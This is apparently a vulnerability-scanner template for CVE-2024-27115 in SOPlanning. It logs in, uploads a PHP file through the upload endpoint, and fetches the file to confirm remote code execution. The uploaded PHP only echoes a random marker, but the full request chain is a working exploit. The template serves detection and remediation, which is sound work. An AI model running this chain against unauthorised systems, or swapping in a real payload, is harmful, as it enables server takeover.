http:
- matchers:
  - part: body_3
    type: word
    words:
    - '{{randstr}}'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /process/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    login={{username}}&password={{password}}

    '
  - 'POST /process/upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=0ccdfeede39eb97743b39d87536933e1


    --0ccdfeede39eb97743b39d87536933e1

    Content-Disposition: form-data; name="linkid"


    soonghee

    --0ccdfeede39eb97743b39d87536933e1

    Content-Disposition: form-data; name="periodeid"


    0

    --0ccdfeede39eb97743b39d87536933e1

    Content-Disposition: form-data; name="fichiers"


    {{randstr}}.php

    --0ccdfeede39eb97743b39d87536933e1

    Content-Disposition: form-data; name="type"


    upload

    --0ccdfeede39eb97743b39d87536933e1

    Content-Disposition: form-data; name="fichier-0"; filename="{{filename}}.php"

    Content-Type: application/x-php


    <?php echo ''{{randstr}}''; ?>

    --0ccdfeede39eb97743b39d87536933e1--

    '
  - 'GET /upload/files/soonghee/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-27115
info:
  author: soonghee2@ajou.ac.kr
  classification:
    cpe: cpe:2.3:a:soplanning:soplanning:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-27115
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/S:N/AU:Y/R:I/V:C/RE:M/U:Red
    cvss-score: 10.0
    cwe-id: CWE-434
    epss-percentile: 0.98917
    epss-score: 0.77121
  description: 'Detects a remote code execution vulnerability in SOPlanning version
    1.52.01 through authenticated PHP file upload.

    '
  impact: 'Authenticated attackers can upload and execute arbitrary PHP files through
    the SOPlanning upload functionality, achieving remote code execution.

    '
  name: SOPlanning - Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/52082
  - https://nvd.nist.gov/vuln/detail/CVE-2024-27115
  remediation: 'Update SOPlanning to a version newer than 1.52.01.

    '
  severity: high
  tags: cve,cve2024,soplanning,rce,authenticated,file-upload,intrusive,vuln
variables:
  filename: '{{rand_base(5)}}'
  password: '{{password}}'
  username: '{{username}}'
